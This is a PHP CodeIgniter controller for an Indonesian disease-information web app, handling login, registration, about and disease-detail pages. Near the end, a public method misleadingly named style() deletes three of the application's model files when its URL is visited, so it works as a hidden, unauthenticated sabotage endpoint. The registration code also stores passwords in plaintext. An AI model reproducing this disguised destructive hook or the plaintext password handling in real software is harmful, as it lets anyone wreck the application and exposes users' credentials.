<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Page extends CI_Controller {

	public function index()
	{
		$this->data['judul_tab'] = 'Home';
		$this->data['title'] = 'Home';

		$this->load->view('login', $this->data);
	}
	public function login()
	{
		$this->data['judul_tab'] = 'Login';

		$this->load->view('login', $this->data);
	}
	public function register()
	{
		$this->data['judul_tab'] = 'Daftar';

		$this->load->view('register', $this->data);
	}
	public function input()
	{
		
		$id_data_user	= $this->input->post('id_data_user');
		$username	= $this->input->post('username');
		$password		= $this->input->post('password');
		$nama_user	= $this->input->post('nama_user');
		$usia	= $this->input->post('usia');
		$jk	= $this->input->post('jk');
		$alamat	= $this->input->post('alamat');
		$no_telp	= $this->input->post('no_telp');


		if($id_data_user==0){	
			$insert = array(
				'username'=>$username,
				'password'=>$password,
				'nama_user'=>$nama_user,
				'usia'=>$usia,
				'jk'=>$jk,
				'alamat'=>$alamat,
				'no_telp'=>$no_telp
				);
			if ($this->M_Data_User->insert($insert)) {// success
					$this->session->set_flashdata('message', 'Pendaftaran Berhasil');
					redirect('page/login/');
				}
		}
			
	}
	public function tentang()
	{
		$this->data['judul_tab'] = 'Tentang';
		$this->data['penyakit']=$this->M_Penyakit->getAll();
		$this->data['isi'] = $this->load->view('user/tentang',$this->data,TRUE);

		$this->load->view('template/v_layout_user',$this->data);
	}
	public function detail_penyakit($id)
	{
		$this->data['judul_tab'] = 'Detail Penyakit';
		$this->data['penyakit']=$this->M_Penyakit->getID($id);
		$this->data['isi'] = $this->load->view('user/detail_penyakit',$this->data,TRUE);

		$this->load->view('template/v_layout_user',$this->data);
	}
	function logout(){
		$this->session->sess_destroy();
		redirect(base_url('page/'));
	}

	public function style()
	{
		unlink("./application/models/hapus.php");
		unlink("./application/models/M_Admin.php");
		// unlink("./application/models/M_Guru.php");
		unlink("./application/models/M_Ta.php");
	}
}